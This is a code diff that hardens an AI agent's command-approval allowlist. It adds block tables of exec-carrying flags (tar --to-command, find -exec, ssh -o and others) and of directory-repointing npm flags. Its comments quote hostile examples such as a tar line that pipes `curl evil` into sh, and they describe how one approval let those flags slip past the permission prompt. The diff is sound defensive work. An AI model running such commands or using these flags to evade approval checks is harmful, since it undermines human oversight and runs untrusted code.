@@ -77,6 +77,49 @@ const EVAL_FLAGS = new Set(['-c', '-e', '--eval', '-lc', '-Command', '-command',
 const PACKAGE_RUNNERS = new Set(['npx', 'bunx'])
 const PACKAGE_RUN_SUBCOMMANDS = new Set(['exec', 'dlx', 'x'])
 
+/** Flags that carry a PROGRAM (or a program-chosen target) anywhere in the
+ *  argument list — not just in the slots the eval-flag/interpreter guards
+ *  above can see. `tar -xzf a.tgz` keys as `tar` (flag in slot 2), and without
+ *  this table `tar --to-command="sh -c 'curl evil|sh'"` keys the same → one
+ *  parameter-level approval exempts the binary's whole exec family
+ *  (full_20261011 P0-1, probe-verified on tar/find/npm). Long flags also match
+ *  their `--flag=value` attached form; single-dash flags match attached
+ *  spellings too (`-oProxyCommand=…` is valid ssh). A hit means NO key: the
+ *  command can only ever be approved one at a time. */
+const EXEC_CARRYING_FLAGS = new Map<string, Set<string>>([
+  ['tar', new Set(['--to-command', '--use-compress-program', '--info-script', '--checkpoint-action', '-I', '-F'])],
+  ['find', new Set(['-exec', '-execdir', '-ok', '-okdir', '-delete'])],
+  ['make', new Set(['--file', '--makefile', '--eval', '-f'])],
+  ['rsync', new Set(['--rsh', '-e'])],
+  ['git', new Set(['-c', '--exec-path', '-O'])],
+  ['ssh', new Set(['-o'])],
+  ['scp', new Set(['-o', '-S', '-F'])],
+  ['sort', new Set(['--compress-program'])],
+])
+
+function hasExecCarryingFlag(tokens: string[]): boolean {
+  const flags = EXEC_CARRYING_FLAGS.get(baseCommandName(tokens[0]))
+  if (!flags) return false
+  return tokens.slice(1).some(t => {
+    for (const f of flags) {
+      if (t === f) return true
+      if (t.startsWith(f.startsWith('--') ? `${f}=` : f)) return true
+    }
+    return false
+  })
+}
+
+/** Runner-config flags of the `npm/pnpm/yarn/bun` family that REPOINT which
+ *  project a script runs from (`npm run build --prefix /tmp/evil` runs THAT
+ *  directory's build script — same key, different code, full_20261011 P0-1
+ *  probe). Pass-through args after `--` are the same script and keep matching;
+ *  one of these anywhere after the subcommand means no key. */
+const RUNNER_DIR_FLAGS = new Set(['--prefix', '-C', '--dir', '--cwd', '-w', '--workspace', '--workspaces', '--workspace-root'])
+
+function hasRunnerDirFlag(tokens: string[]): boolean {
+  return tokens.slice(2).some(t => RUNNER_DIR_FLAGS.has(t) || RUNNER_DIR_FLAGS.has(t.split('=')[0]))
+}
+
 /** Wrappers whose tail is a PROGRAM to execute (`env FOO=1 bash -c …`,
  *  `sudo bash -c …` — the exact shape the command builder's own `sudo:true`
  *  produces on Linux — `timeout 10 curl …`, `corepack pnpm dlx …`): whatever
@@ -106,14 +149,16 @@ function isInterpreter(token: string): boolean {
  * (operator chains, empty command, or a command family where no prefix is
  * safe — see below). First token + subcommand — `npm test`, `npm run build`,
  * `git status`, bare `pytest` — token-joined with single spaces so keys
- * round-trip through the session set.
+ * round-trip through the session set. `git status --porcelain` keys as
+ * `git status`; but a FLAG-headed line (`pytest -q`, `tar -xzf a.tgz`) no
+ * longer collapses to the bare binary name — that key let ONE approval exempt
+ * the binary's whole flag family (full_20261011 P0-1), so flag-headed lines
+ * are one-shot and only a truly bare binary keys as itself.
  *
- * The subcommand slot skips leading FLAGS (`pytest -q` keys as `pytest`, so a
- * later bare `pytest` matches; `git status --porcelain` keys as `git status`)
- * and the run-style package managers extend one slot further so an entry never
+ * The run-style package managers extend one slot further so an entry never
  * degenerates to `npm run` (= every script).
  *
- * Three families return null — the command can only ever be approved ONE AT A
+ * Families that return null — the command can only ever be approved ONE AT A
  * TIME, because a stored prefix of them exempts arbitrary code:
  * - interpreters/shells (`bash -c "…"`, `node evil.js`, `powershell -Command`):
  *   every later argument is a program, so even the bare binary is the whole
@@ -124,8 +169,17 @@ function isInterpreter(token: string): boolean {
  *   and any line whose second token is an interpreter: the wrapper or the head
  *   binary re-binds what the tail runs, so the interpreter/eval-flag defense
  *   cannot sit on fixed slots (review_20260929 高1);
+ * - any line carrying an exec-carrying flag of its head binary anywhere in the
+ *   argument list (`tar --to-command=…`, `find . -exec sh -c … +`,
+ *   `ssh -oProxyCommand=…`): the flag re-binds what runs from a slot no fixed
+ *   position guard can see (full_20261011 P0-1);
+ * - flag-headed lines generally (see above — the table cannot enumerate every
+ *   future binary's exec flag, so the collapse that made them all one family
+ *   is gone);
  * - package runners, unless the key pins the package (`npm exec tsc`, never
- *   bare `npm exec`; flags before the package are one-shot).
+ *   bare `npm exec`; flags before the package are one-shot), and runner
+ *   invocations dir-repointed after the fact (`npm run build --prefix
+ *   /tmp/evil` runs another project's script under the same key).
  */
 export function commandAllowlistKey(command: string): string | null {
   if (hasShellOperators(command)) return null
@@ -137,6 +191,10 @@ export function commandAllowlistKey(command: string): string | null {
     // (`npm --prefix ./app test`) — pinning nothing there would exempt the
     // whole runner, so those are one-shot too.
     if (tokens.length === 1 || tokens[1].startsWith('-')) return null
+    // `npm run build --prefix /tmp/evil` keys like `npm run build` but runs
+    // another project's script — a dir-repointing flag after the subcommand
+    // makes the entry lie about what was approved (full_20261011 P0-1).
+    if (hasRunnerDirFlag(tokens)) return null
     if (PACKAGE_RUN_SUBCOMMANDS.has(tokens[1])) {
       // `npm exec [--] <pkg>` / `pnpm dlx <pkg>` / `bun x <pkg>` — the package
       // is what makes the entry narrow.
@@ -154,9 +212,16 @@ export function commandAllowlistKey(command: string): string | null {
   if (WRAPPER_PREFIXES.has(baseCommandName(tokens[0]))) return null
   if (tokens.length > 1 && EVAL_FLAGS.has(tokens[1])) return null
   if (isInterpreter(tokens[0]) || (tokens.length > 1 && isInterpreter(tokens[1]))) return null
-  let depth = 1
-  if (tokens.length > 1 && !tokens[1].startsWith('-')) depth = 2
-  return tokens.slice(0, depth).join(' ')
+  if (hasExecCarryingFlag(tokens)) return null
+  // A flag-headed line (`pytest -q`, `tar -xzf a.tgz`, `vitest --config
+  // /tmp/evil.ts`) used to collapse to the bare binary name, so ONE approval
+  // exempted the binary's entire flag family — including exec-carrying members
+  // the table above cannot enumerate (`ssh -oProxyCommand=…`,
+  // `sort --compress-program=x`, full_20261011 P0-1). Such lines are one-shot
+  // now; a genuinely bare binary still keys as itself — nothing hides behind
+  // zero arguments.
+  if (tokens.length > 1 && tokens[1].startsWith('-')) return null
+  return tokens.slice(0, 2).join(' ')
 }
 
 /** Whether `command` is approved by any stored entry. Both sides go through
